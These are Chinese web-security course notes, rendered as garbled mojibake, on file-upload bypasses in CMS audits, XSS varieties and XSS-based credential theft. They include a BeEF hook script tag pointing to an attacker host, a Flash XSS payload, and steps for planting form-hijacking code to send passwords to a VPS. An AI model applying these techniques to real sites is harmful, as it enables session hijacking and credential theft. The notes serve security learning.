<h4 id="å®ä¾‹CMS-å¹³å°-ä¸­é—´ä»¶è§£æ-ç¼–è¾‘å™¨å¼•ç”¨"><a href="#å®ä¾‹CMS-å¹³å°-ä¸­é—´ä»¶è§£æ-ç¼–è¾‘å™¨å¼•ç”¨" class="headerlink" title="#å®ä¾‹CMS&amp;å¹³å°-ä¸­é—´ä»¶è§£æ&amp;ç¼–è¾‘å™¨å¼•ç”¨"></a>#å®ä¾‹CMS&amp;å¹³å°-ä¸­é—´ä»¶è§£æ&amp;ç¼–è¾‘å™¨å¼•ç”¨</h4><p>1ã€ä¸­é—´ä»¶é…ç½®ä¸å½“å¯¼è‡´æ–‡ä»¶è¢«æ¶æ„è§£æ<br>2ã€CMSæºç å¼•ç”¨å¤–éƒ¨ç¼–è¾‘å™¨å®ç°æ–‡ä»¶ä¸Šä¼ </p>
<h1 id="ç¬¬34å¤©-WEBæ”»é˜²-é€šç”¨æ¼åŒ8-æ–‡ä»¶ä¸Šä¼ 8é»‘ç™½ç›’å®¡è®¡8é€»æ-ä¸­é—´ä»¶-å¤–éƒ¨å¼•ç”¨"><a href="#ç¬¬34å¤©-WEBæ”»é˜²-é€šç”¨æ¼åŒ8-æ–‡ä»¶ä¸Šä¼ 8é»‘ç™½ç›’å®¡è®¡8é€»æ-ä¸­é—´ä»¶-å¤–éƒ¨å¼•ç”¨" class="headerlink" title="ç¬¬34å¤© WEBæ”»é˜²-é€šç”¨æ¼åŒ8&amp;æ–‡ä»¶ä¸Šä¼ 8é»‘ç™½ç›’å®¡è®¡8é€»æ&amp;ä¸­é—´ä»¶&amp;å¤–éƒ¨å¼•ç”¨"></a>ç¬¬34å¤© WEBæ”»é˜²-é€šç”¨æ¼åŒ8&amp;æ–‡ä»¶ä¸Šä¼ 8é»‘ç™½ç›’å®¡è®¡8é€»æ&amp;ä¸­é—´ä»¶&amp;å¤–éƒ¨å¼•ç”¨</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-17"><a href="#çŸ¥è¯†ç‚¹ï¼š-17" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€ç™½ç›’å®¡è®¡ä¸‰è¦ç´ <br>2ã€é»‘ç›’å®¡è®¡å››è¦ç´ <br>3ã€ç™½é»‘æµ‹è¯•æµç¨‹æ€è·¯</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-6"><a href="#è¯¦ç»†ç‚¹ï¼š-6" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>1ã€æ£€æµ‹å±‚é¢ï¼šå‰ç«¯ï¼Œåç«¯ç­‰<br>2ã€æ£€æµ‹å†…å®¹ï¼šæ–‡ä»¶å¤´ï¼Œå®Œæ•´æ€§ï¼ŒäºŒæ¬¡æ¸²æŸ“ç­‰<br>3ã€æ£€æµ‹åç¼€ï¼šé»‘åå•ï¼Œç™½åå•ï¼ŒMIMEæ£€æµ‹ç­‰<br>4ã€ç»•è¿‡æŠ€å·§ï¼šå¤šåç¼€è§£æï¼Œæˆªæ–­ï¼Œä¸­é—´ä»¶ç‰¹æ€§ï¼Œæ¡ä»¶ç«Ÿäº‰ç­‰</p>
<h4 id="æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š-3"><a href="#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š-3" class="headerlink" title="#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š"></a>#æœ¬ç« è¯¾ç¨‹å†…å®¹ï¼š</h4><p>1ã€æ–‡ä»¶ä¸Šä¼ -CTFèµ›é¢˜çŸ¥è¯†ç‚¹<br>2ã€æ–‡ä»¶ä¸Šä¼ -ä¸­é—´ä»¶è§£æ&amp;ç¼–è¾‘å™¨å®‰å…¨<br>3ã€æ–‡ä»¶ä¸Šä¼ -å®ä¾‹CMSæ–‡ä»¶ä¸Šä¼ å®‰å…¨åˆ†æ</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹-1"><a href="#æ¼”ç¤ºæ¡ˆä¾‹-1" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h4><p>ç™½ç›’å®¡è®¡-Finecms-ä»£ç å¸¸è§„-å¤„ç†é€»è¾‘<br>ç™½ç›’å®¡è®¡-CuppaCms-ä¸­é—´ä»¶.htaccess<br>ç™½ç›’å®¡è®¡-Metinfoâ€“ç¼–è¾‘å™¨å¼•ç”¨-ç¬¬ä¸‰æ–¹å®‰å…¨</p>
<h4 id="ç™½ç›’å®¡è®¡-Finecms-ä»£ç å¸¸è§„-å¤„ç†é€»è¾‘"><a href="#ç™½ç›’å®¡è®¡-Finecms-ä»£ç å¸¸è§„-å¤„ç†é€»è¾‘" class="headerlink" title="#ç™½ç›’å®¡è®¡-Finecms-ä»£ç å¸¸è§„-å¤„ç†é€»è¾‘"></a>#ç™½ç›’å®¡è®¡-Finecms-ä»£ç å¸¸è§„-å¤„ç†é€»è¾‘</h4><p><a href="https://blog.csdn.net/m0_52920608/article/details/124457816">https://blog.csdn.net/m0_52920608/article/details/124457816</a></p>
<p>é»‘ç›’æ€è·¯ï¼šå¯»æ‰¾ä¸Šä¼ ç‚¹æŠ“åŒ…ä¿®æ”¹çªç ´è·å–çŠ¶æ€ç åŠåœ°å€<br>å®¡è®¡æµç¨‹ï¼šåŠŸèƒ½ç‚¹ä»£ç æ–‡ä»¶ä»£ç å—æŠ“åŒ…è°ƒè¯•éªŒè¯æµ‹è¯•</p>
<h4 id="ç™½ç›’å®¡è®¡-CuppaCms-ä¸­é—´ä»¶-htaccess"><a href="#ç™½ç›’å®¡è®¡-CuppaCms-ä¸­é—´ä»¶-htaccess" class="headerlink" title="#ç™½ç›’å®¡è®¡-CuppaCms-ä¸­é—´ä»¶-.htaccess"></a>#ç™½ç›’å®¡è®¡-CuppaCms-ä¸­é—´ä»¶-.htaccess</h4><p>æ€»ç»“ï¼šæ¼æ´äº§ç”Ÿä½ç½®åœ¨ç”¨æˆ·ä¸­å¿ƒä¸Šä¼ å¤´åƒå¤„ï¼Œå› ä¸ºæœªå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè¿‡æ»¤å¯¼è‡´å¯ä»¥ä¸Šä¼ å«æœ‰åé—¨ä»£ç çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ–‡ä»¶ä¸Šä¼ åä¼šå¯¹æ–‡ä»¶è¿›è¡Œé‡æ–°å‘½åï¼Œé»‘ç›’æµ‹è¯•ä¸­ä¼šå› ä¸ºä¸çŸ¥é“ä¸Šä¼ æ–‡ä»¶è·¯å¾„æ–‡ä»¶åå¯¼è‡´æ— æ³•è¿æ¥shellï¼Œç™½ç›’æµ‹è¯•ä¸­åˆ™å¯ä»¥çœ‹åˆ°æ–‡ä»¶è¢«å‘½åä¸º0x00.php</p>
<p>é»‘ç›’æ€è·¯ï¼šå­˜åœ¨æ–‡ä»¶ç®¡ç†ä¸Šä¼ æ”¹åå¥•ç ´ï¼Œè®¿é—®ååœ¨çªç ´<br>å®¡è®¡æµç¨‹ï¼šåŠŸèƒ½ç‚¹ä»£ç æ–‡ä»¶-ä»£ç å—æŠ“åŒ…è°ƒè¯•éªŒè¯æµ‹è¯•<br>æ€»ç»“ï¼šä¸Šä¼ ç‚¹åœ¨åå°æ–‡ä»¶ç®¡ç†â€“ä¿®æ”¹åç§°å¤„â€“ä¸Šä¼ å‡ºä¼šå¯¹æ–‡ä»¶è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ä¸”ä¼šå¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åå¯¼è‡´ä¸Šä¼ .user.inå’Œ.htaccessä¸Šä¼ å¤±è´¥ï¼ˆç™½åå•ï¼‰ï¼Œåœ¨æ–‡ä»¶ç®¡ç†å¤„å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œæ­¤å¤„æŠ“åŒ…å¯ä»¥æŠ“åˆ°é‡å‘½åçš„æ•°æ®åŒ…ï¼Œä¿®æ”¹é‡å‘½ååçš„æ–‡ä»¶åå¯ä»¥å°†pngæ–‡ä»¶ä¿®æ”¹æˆphpæ–‡ä»¶ï¼Œè®¿é—®å‘ç°403ï¼Œæ˜¯ç”±äº.htaccessé…ç½®æ–‡ä»¶å¯¼è‡´mediaæ–‡ä»¶å¤¹ä¸‹php exe php5 ç­‰åç¼€åæ— æ³•è®¿é—®ï¼Œåœ¨é‡å‘½åå¤„æ”¹åŒ….&#x2F;&#x2F; å°†æ–‡ä»¶ä¸Šä¼ åˆ°ä¸Šä¸€çº§ç›®å½•ç»•è¿‡ï¼Œæ–‡ä»¶è®¿é—®æ­£å¸¸ã€‚ç¬¬äºŒç§ç»•è¿‡æ€è·¯ï¼šç›´æ¥æŠŠ.htaccessæ–‡ä»¶åˆ é™¤ã€‚</p>
<h4 id="ç™½ç›’å®¡è®¡-Metinfo-ç¼–è¾‘å™¨å¼•ç”¨-ç¬¬ä¸‰æ–¹å®‰å…¨"><a href="#ç™½ç›’å®¡è®¡-Metinfo-ç¼–è¾‘å™¨å¼•ç”¨-ç¬¬ä¸‰æ–¹å®‰å…¨" class="headerlink" title="#ç™½ç›’å®¡è®¡-Metinfo-ç¼–è¾‘å™¨å¼•ç”¨-ç¬¬ä¸‰æ–¹å®‰å…¨"></a>#ç™½ç›’å®¡è®¡-Metinfo-ç¼–è¾‘å™¨å¼•ç”¨-ç¬¬ä¸‰æ–¹å®‰å…¨</h4><p>é»‘ç›’æ€è·¯ï¼šæ¢é’ˆç›®å½•åˆ©ç”¨ç¼–è¾‘å™¨æ¼æ´éªŒè¯æµ‹è¯•<br>å®¡è®¡æµç¨‹ï¼šç›®å½•ç»“æ„-å¼•ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å™¨å®‰å…¨æŸ¥è¯¢-EXPåˆ©ç”¨éªŒè¯<br>æ€»ç»“ï¼šç›®å½•æ‰«æâ€“æ‰«æå‡ºfackeditorç›®å½•â€“åˆ¤æ–­ç‰ˆæœ¬â€“ä½¿ç”¨expä¸Šä¼ webshell</p>
<h4 id="æ–‡ä»¶ä¸Šä¼ ï¼š"><a href="#æ–‡ä»¶ä¸Šä¼ ï¼š" class="headerlink" title="#æ–‡ä»¶ä¸Šä¼ ï¼š"></a>#æ–‡ä»¶ä¸Šä¼ ï¼š</h4><p>é»‘ç›’ï¼šå¯»æ‰¾ä¸€åˆ‡å­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„åŠŸå½°åº”ç”¨<br>1ã€ä¸ªäººç”¨æˆ·ä¸­å¿ƒæ˜¯å¦å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½<br>2ã€åå°ç®¡ç†ç³»ç»Ÿæ˜¯ä½›å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½<br>3ã€å­—å…¸ç›®å½•æ‰«ææ¢é’ˆæ–‡ä»¶ä¸Šä¼ æ„é€ åœ°å€<br>4ã€å­—å…¸ç›®å½•æ‰«ææ¢é’ˆç¼–è¾‘å™¨ç›®å½•æ„é€ åœ°å€<br>ç™½ç›’ï¼šçœ‹ä¸‰ç‚¹ï¼Œä¸­é—´ä»¶ï¼Œç¼–è¾‘å™¨ï¼ŒåŠŸèƒ½ä»£ç <br>1ã€ä¸­é—´ä»¶ç›´æ¥çœ‹è¯­è¨€ç¯å¢ƒå¸¸è§æ­é…<br>2ã€ç¼–è¾‘å™¨ç›´æ¥çœ‹ç›®å½•æœºæ„æˆ–æœç´¢å…³é”®å­—<br>3ã€åŠŸèƒ½ä»£ç ç›´æ¥çœ‹æºç åº”ç”¨æˆ–æœç´¢å…³é”®å­—</p>
<h1 id="ç¬¬35å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XSSè·¨ç«™-åå°„-å­˜å‚¨-DOM-ç›²æ‰“-åŠ«æŒ"><a href="#ç¬¬35å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XSSè·¨ç«™-åå°„-å­˜å‚¨-DOM-ç›²æ‰“-åŠ«æŒ" class="headerlink" title="ç¬¬35å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XSSè·¨ç«™&amp;åå°„&amp;å­˜å‚¨&amp;DOM&amp;ç›²æ‰“&amp;åŠ«æŒ"></a>ç¬¬35å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XSSè·¨ç«™&amp;åå°„&amp;å­˜å‚¨&amp;DOM&amp;ç›²æ‰“&amp;åŠ«æŒ</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-18"><a href="#çŸ¥è¯†ç‚¹ï¼š-18" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€XSSè·¨ç«™-åŸç†&amp;æ”»å‡»&amp;åˆ†ç±»ç­‰<br>2ã€XSSè·¨ç«™-åå°„å‹&amp;å­˜å‚¨å‹&amp;DOMå‹ç­‰<br>3ã€XSSè·¨ç«™æ”»å‡»æ‰‹æ³•&amp;åŠ«æŒ&amp;æ£å–å‡­æ®ç­‰<br>4ã€XSSè·¨ç«™-æ”»å‡»é¡¹ç›®&amp;XSSå¹³å°&amp;Beef-XSS</p>
<p>1ã€åŸç†<br>æŒ‡æ”¹å‡»è€…åˆ©ç”¨ç½‘ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥è¿‡ä¸è¶³ï¼Œç«¯å…¥å¯ä»¥é‡ç¤ºåœ¨é¡µé¢ä¸Šå¯¹å…¶ä»–ç”¨å°¸é“æˆå½±å“çš„HTMLä»£ç ï¼Œä»è€Œç›—å–ç”¨æˆ·èµ„æ–™ã€åˆ©ç”¨ç”¨æˆ·å…·ä»½è¿›è¡ŒæŸç§åŠ¨æˆ–è€…å¯¹è®¿é—®è€…è¿›è¡Œç—…æ¯’ä¾µå®³çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œé€šè¿‡åœ¨ç”¨æˆ·ç«¯æ³¨å…¥æ¶æ„çš„å¯æ‰§è¡Œè„šæœ¬ï¼Œè‹¥æœåŠ¡å™¨æ—¶ç”¨æˆ·çš„ç¬¬äººä¸è¿›è¡Œå¤„ç†æˆ–å¤„ç†ä¸ä¸¥ï¼Œåˆ™æµè§ˆå™¨å°±ä¼šå¤æ¥æ‰§è¡Œç”¨æˆ·æ³¨å…¥çš„è„šæœ¬ã€‚<br>äº§ç”Ÿçš„åœ°ç‚¹ï¼š<br>æ•°æ®æ–‡äº’çš„åœ°æ–¹<br>get.post.headers<br>åé¦ˆä¸æµè§ˆ<br>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨<br>å„ç±»æ ‡ç­¾æ’å…¥å’Œè‡ªå®šä¹‰<br>æ•°æ®è¾“å‡ºçš„åœ°æ–¹<br>ç”¨æˆ·èµ„æ–™<br>å…³é”®è¯ã€æ ‡ç­¾ã€è¯´æ˜<br>æ–‡ä»¶ä¸Šä¼ </p>
<p>2ã€åˆ†ç±»<br>åå°„å‹ï¼ˆéæŒä¹…å‹ï¼‰<br>å­˜å‚¨å‹ï¼ˆç‰¹ä¹…å‹ï¼‰<br>DOMå‹<br>mXSS(çªå˜å‹XSS)<br>UXSS(é€šç”¨å‹XSs)<br>Flash XSS<br>UTF-7 XSS<br>MHTML XSS<br>CSS XSS<br>VBScript XSS</p>
<p>3ã€å±å®³<br>ç½‘ç»œé’“é±¼ï¼ŒåŒ…æ‹¬è·å–å„ç±»ç”¨æˆ·è´¦å·ï¼š<br>çªƒå–ç”¨æˆ·cookiesèµ„æ–™ï¼Œä»è€Œè·å–ç”¨æˆ·éšç§ä¿¡æ¯ï¼Œæˆ–åˆ©ç”¨ç”¨æˆ·èº«ä»½å¯¹ç½‘ç«™æ‰§è¡Œæ“ä½œï¼›<br>åŠ«æŒç”¨æˆ·ï¼ˆæµè§ˆå™¨ï¼‰ä¼šè¯ï¼Œä»è€Œæ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚éæ³•è½¬è´¦ã€å‘è¡¨æ—¥å¿—ã€é‚®ä»¶ç­‰ï¼›<br>å¼ºåˆ¶å¼¹å‡ºå¹¿å‘Šé¡µé¢ã€åˆ·æµé‡ç­‰ï¼š<br>ç½‘é¡µæŒ‚é©¬ï¼›<br>è¿›è¡Œæ¶æ„æ“ä½œï¼Œå¦‚ä»»æ„ç®—æ”¹é¡µé¢ä¿¡æ¯ã€åˆ«é™¤æ–‡ç« ç­‰ï¼›<br>è¿›è¡Œå¤§é‡çš„å®¢æˆ·ç«¯æ”»å‡»ï¼Œå¦‚ddosç­‰ï¼›<br>è·å–å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·çš„æµè§ˆå†å²ã€çœŸå®å³ã€å¼€æ”¾ç«¯å£ç­‰ï¼›<br>æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶ä»–ç½‘ç«™å‘èµ·æ”»å‡»ï¼›<br>ç»“åˆå…¶ä»–æ¼æ´ï¼Œå¦‚cSä»€ï¼Œå®æ–½è¿›ä¸€æ­¥å±å®³ï¼›<br>æå‡ç”¨æˆ·æƒé™ï¼ŒåŒ…æ‹¬è¿›ä¸€æ­¥æ¸—é€ç½‘ç«™ï¼›<br>ä¼ æ‡‚è·¨ç«™å´æœ¬èºè™«ç­‰</p>
<h4 id="XSSè·¨ç«™ç³»åˆ—å†…å®¹ï¼š"><a href="#XSSè·¨ç«™ç³»åˆ—å†…å®¹ï¼š" class="headerlink" title="#XSSè·¨ç«™ç³»åˆ—å†…å®¹ï¼š"></a>#XSSè·¨ç«™ç³»åˆ—å†…å®¹ï¼š</h4><p>1åŠ ç²—æ ·å¼ã€XSSè·¨ç«™-åŸç†8åˆ†ç±»8æ‰‹æ³•<br>2ã€XSSç«™-æ¢é’ˆ&amp;åˆ©ç”¨&amp;å®¡è®¡<br>3ã€XSSè˜ç«™-å¦ç±»æ”»å‡»æ‰‹æ³•åˆ©ç”¨<br>4ã€XSSè·¨ç«™-é˜²å¾¡ä¿®å¤8é¥¶è¿‡ç­–æš—</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-13"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-13" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>XSSè·¨ç«™-åŸç†&amp;åˆ†ç±»&amp;æ‰‹æ³•&amp;æ¢é’ˆ<br>åå°„å‹å®ä¾‹-UAæŸ¥è¯¢å¹³å°æ•°æ®è¾“å‡º<br>æ€è·¯ï¼šç½‘ç«™å­˜åœ¨è¯»å–è¯·æ±‚åŒ…ä¸­UAå¤´å¹¶æ˜¾ç¤ºçš„åŠŸèƒ½â€“æŠ“åŒ…ä¿®æ”¹UAå¤´æ·»åŠ xssè¯­å¥â€“xssè¯­å¥æ‰§è¡Œ<br>å­˜å‚¨å‹å®ä¾‹-è®¢å•ç³»ç»ŸCMSæƒé™è·å–<br>æ€è·¯ï¼šç•™è¨€æ¿å¤„ä¼šå°†è¾“å…¥ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œåå°ç®¡ç†å‘˜æŸ¥çœ‹æ—¶ä¼šæ‰§è¡Œxssè¯­å¥ã€‚æ­¤å¤„xssè¯­å¥å¯ä»¥æ›¿æ¢ä¸ºç›—å–cookieçš„è¯­å¥ï¼Œç®¡ç†å‘˜æ‰§è¡Œåå°†ç®¡ç†å‘˜è´¦å·cookieå‘é€åˆ°xsså¹³å°ï¼Œä»è€Œç›—å–cookieã€‚<br>DOMå‹å®ä¾‹-EmpireCMSå‰ç«¯é¡µé¢å®¡è®¡<br>javascript:alter(1)è¿™é‡Œä¸æ˜¯ä¼ å‚ï¼Œå› æ­¤è¦æ”¹å˜å†™æ³•<br>XSSåˆ©ç”¨ç¯å¢ƒ-XSSå¹³å°&amp;Beef-XSSé¡¹ç›®      â€”Beefå¾ˆæœ‰ç”¨ï¼Œç›´æ¥è¦æ˜¯å—å®³è€…è®¿é—®ä½ çš„ç½‘ç«™ï¼Œå³å¯å»æ‰§è¡Œç›¸å…³æœ‰å®³äº‹ä»¶ã€‚<br>æ­å»ºbeef-xsså¹³å°åï¼Œè‹¥å—å®³è€…è®¿é—® <script src="http://192.168.1.105:3000/hook.js"></script> åˆ™ä¼šè¢«åŠ«æŒæµè§ˆå™¨ï¼Œå¯ä»¥è·å–å—å®³è€…cookieã€è·³è½¬ç½‘ç«™ã€é’“é±¼ç­‰ã€‚<br>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_53517370/article/details/128992559">https://blog.csdn.net/qq_53517370/article/details/128992559</a>    â€“å¾ˆä¸é”™ï¼Œè®²äº†å¾ˆå¤šbeefçš„ä½¿ç”¨æ–¹æ³•</p>
<h1 id="ç¬¬36å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XSSè·¨ç«™-MXSS-UXSS-FlashXSS-PDFXSS"><a href="#ç¬¬36å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XSSè·¨ç«™-MXSS-UXSS-FlashXSS-PDFXSS" class="headerlink" title="ç¬¬36å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XSSè·¨ç«™&amp;MXSS&amp;UXSS&amp;FlashXSS&amp;PDFXSS"></a>ç¬¬36å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XSSè·¨ç«™&amp;MXSS&amp;UXSS&amp;FlashXSS&amp;PDFXSS</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-19"><a href="#çŸ¥è¯†ç‚¹ï¼š-19" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p><a href="https://blog.csdn.net/m0_60571842/article/details/132763262">https://blog.csdn.net/m0_60571842/article/details/132763262</a>      â€”å¯¹å…¨éƒ¨xssè¿›è¡Œæ›´è¯¦ç»†çš„è®²è§£</p>
<p>mXSS(çªå˜å‹XSS)<br>UXSS(é€šç”¨å‹XSs)<br>Flash XSS<br>UTF-7 XSS<br>MHTML XSS<br>CSS XSS<br>VBScript XSS</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-14"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-14" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>UXSS-Edge&amp;CVE-2021-34506<br>FlashXSS-PHPWind.&amp;SWFåç¼–è¯‘<br>PDFXSS-PDFåŠ¨ä½œæ·»åŠ &amp;æ–‡ä»¶ä¸Šä¼ </p>
<h4 id="MXSS-https-www-fooying-com-the-art-of-xss-1-introduction"><a href="#MXSS-https-www-fooying-com-the-art-of-xss-1-introduction" class="headerlink" title="#MXSS:https://www.fooying.com/the-art-of-xss-1-introduction/"></a>#MXSS:<a href="https://www.fooying.com/the-art-of-xss-1-introduction/">https://www.fooying.com/the-art-of-xss-1-introduction/</a></h4><h4 id="UXsSå…¨ç§°Jniversal-Cross-Site-Scripting"><a href="#UXsSå…¨ç§°Jniversal-Cross-Site-Scripting" class="headerlink" title="#UXsSå…¨ç§°Jniversal Cross-.Site Scripting"></a>#UXsSå…¨ç§°Jniversal Cross-.Site Scripting</h4><p>UXSSæ˜¯åˆ©ç”¨æµè§ˆå™¨æˆ–è€…æµè§ˆå™¨æ‰©å±•æ¼æ´æ¥åˆ¶é€ äº§ç”ŸXSSå¹¶æ‰§è¡Œä»£ç çš„ä¸€ç§æ”»å‡»ç±»å‹ã€‚<br>MICROSOFT EDGE UXSS CVE-2021-34506<br>Edgeæµè§ˆå™¨ç¿»è¯‘åŠŸèƒ½å¯¼è‡´JSè¯­å¥è¢«è°ƒç”¨æ‰§è¡Œ<br><a href="https://www.bilibili.com/video/BV1fX4y1c7rX">https://www.bilibili.com/video/BV1fX4y1c7rX</a></p>
<h4 id="Flashxss-swfå¼•ç”¨jsçš„xss"><a href="#Flashxss-swfå¼•ç”¨jsçš„xss" class="headerlink" title="#Flashxss-swfå¼•ç”¨jsçš„xss"></a>#Flashxss-swfå¼•ç”¨jsçš„xss</h4><p>JPEXS Free Flash Decompiler<br>phpwind SWFåç¼–è¯‘Flashxss<br>Externallnterface.callæ‰§è¡ŒJSä»£ç <br>Payload:&#x2F;res&#x2F;js&#x2F;dev&#x2F;util_libs&#x2F;jPlayer&#x2F;Jplayer.swf?jQuery&#x3D;alert(1)))catch(e)0&#x2F;&#x2F;<br>æ€è·¯ï¼šç±»ä¼¼åå°„å‹XSSï¼Œé€šè¿‡å¯¹wsfæ–‡ä»¶è¿›è¡Œåç¼–è¯‘æ‰¾å‡ºä¼ å‚ç‚¹ï¼Œæ„é€ é—­åˆä¼ å‚ä½¿å¾—xssè¯­å¥æ‰§è¡Œ</p>
<h4 id="PDFXSS-ä¸Šä¼ åç›´é“¾å‘"><a href="#PDFXSS-ä¸Šä¼ åç›´é“¾å‘" class="headerlink" title="#PDFXSS-ä¸Šä¼ åç›´é“¾å‘"></a>#PDFXSS-ä¸Šä¼ åç›´é“¾å‘</h4><p>1ã€åˆ›å»ºPDF,åŠ å…¥åŠ¨ä½œJS<br>2ã€é€šè¿‡æ–‡ä»¶ä¸Šä¼ è·å–ç›´é“¾<br>3ã€ç›´é“¾åœ°å€è®¿é—®åè¢«ç¼ºå‘<br>å±å®³ï¼šæ¶æ„pdfä¸Šä¼ ï¼Œå—å®³è€…ç‚¹å‡»æ–‡ä»¶åˆ†äº«é“¾æ¥å¯è¢«XSSå¹³å°å’Œbeefxsså¹³å°åˆ©ç”¨</p>
<h1 id="ç¬¬37å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XSSè·¨ç«™-æƒé™ç»´æŒ-é’“é±¼æ†ç»‘-æµè§ˆå™¨æ¼æ´"><a href="#ç¬¬37å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XSSè·¨ç«™-æƒé™ç»´æŒ-é’“é±¼æ†ç»‘-æµè§ˆå™¨æ¼æ´" class="headerlink" title="ç¬¬37å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XSSè·¨ç«™&amp;æƒé™ç»´æŒ&amp;é’“é±¼æ†ç»‘&amp;æµè§ˆå™¨æ¼æ´"></a>ç¬¬37å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XSSè·¨ç«™&amp;æƒé™ç»´æŒ&amp;é’“é±¼æ†ç»‘&amp;æµè§ˆå™¨æ¼æ´</h1><h4 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>XSSè·¨ç«™-å¦ç±»æ”»å‡»æ‰‹æ³•åˆ©ç”¨</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-15"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-15" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>XSS-åå°æ¤å…¥Cookie&amp;è¡¨å•åŠ«æŒ<br>XSS-Flashé’“é±¼é…åˆMSFæ†ç»‘ä¸Šçº¿<br>XSS-æµè§ˆå™¨ç½‘é©¬é…åˆMSFè®¿é—®ä¸Šçº¿</p>
<h4 id="XSS-åå°æ¤å…¥Cookie-è¡¨å•åŠ«æŒ"><a href="#XSS-åå°æ¤å…¥Cookie-è¡¨å•åŠ«æŒ" class="headerlink" title="#XSS-åå°æ¤å…¥Cookie&amp;è¡¨å•åŠ«æŒ"></a>#XSS-åå°æ¤å…¥Cookie&amp;è¡¨å•åŠ«æŒ</h4><p>æ¡ä»¶ï¼šå·²å–å¾—ç›¸å…³webæƒé™å         â€”å°±æ¯”å¦‚å°†å±é™©xssä»£ç æ”¾åœ¨åšå®¢çš„ä¸»é¡µï¼Œå°±å¯ä»¥å»åˆ©ç”¨beefå»è·å–è®¿é—®è€…çš„ä¿¡æ¯<br>1ã€å†™å…¥ä»£ç åˆ°ç™»å½•æˆåŠŸæ–‡ä»¶ï¼Œåˆ©ç”¨beefæˆ–xsså¹³å°å®æ—¶ç›‘æ§Cookieç­‰å‡­æ®å®ç°æƒé™ç»´æŒ<br>ï¼ˆæ€è·¯ï¼šå°†xssè¯­å¥å†™å…¥ç™»å½•æˆåŠŸçš„é»˜è®¤æ–‡ä»¶ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç›´æ¥å°†ä¿¡æ¯å‘é€åˆ°xsså¹³å°ï¼‰<br>2ã€è‹¥å­˜åœ¨åŒæºç­–è·¯æˆ–é˜²æŠ¤æƒ…å†µä¸‹ï¼ŒCookieè·å–å¤±è´¥å¯é‡‡ç”¨è¡¨å•åŠ«æŒæˆ–æ•°æ®æ˜æ–‡ä¼ è¾“å®ç°<br>ï¼ˆæ€è·¯ï¼šå°†xssè¯­å¥å†™å…¥éªŒè¯å¯†ç çš„æ–‡ä»¶ï¼Œè®¾ç½®å˜é‡æ¥æ”¶ç”¨æˆ·åå’Œå¯†ç é€šè¿‡xssè¯­å¥é€åˆ°åˆ°VPSæ¥æ”¶æ•°æ®ï¼‰</p>
